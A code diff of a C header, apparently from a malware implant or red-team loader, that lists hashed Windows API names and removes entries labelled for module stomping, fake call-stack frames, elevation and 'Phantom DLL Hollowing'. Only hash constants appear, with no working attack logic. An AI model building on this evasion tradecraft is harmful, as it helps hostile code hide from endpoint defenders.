@@ -35,22 +35,8 @@
 #define NtClose_JOAAT                   0xB1D7C572
 #define NtTerminateProcess_JOAAT        0x9C12CA95
 
-// ----------- Unwind-info registration for stomped modules -----------
-#define RtlAddFunctionTable_JOAAT       0xF1F158AB
-
-// ----------- Synthetic call-stack frames (Draugr MVP) -----------
-// (NtWaitForSingleObject_JOAAT is already defined above — reused here as
-// one of the three anchor RIPs for the fake stack.)
-#define RtlUserThreadStart_JOAAT        0xF7972684
-#define BaseThreadInitThunk_JOAAT       0x50635B44
-
-// ----------- Elevation (kernel32 exports) -----------
+// ----------- Elevation / Install (kernel32 exports) -----------
 #define GetModuleFileNameA_JOAAT        0x665A0D0F
-
-// ----------- Phantom DLL Hollowing Hashes (kernel32 exports) -----------
-#define ReadFile_JOAAT                  0x62BF1D54
-#define WriteFile_JOAAT                 0x8CFB9E0E
-#define SetFilePointer_JOAAT            0xCF8699F2
 #define CloseHandle_JOAAT               0x8FA1D581
 
 // ----------- Thread Pool Hashes (ntdll exports, resolved via FetchExportAddress) -----------
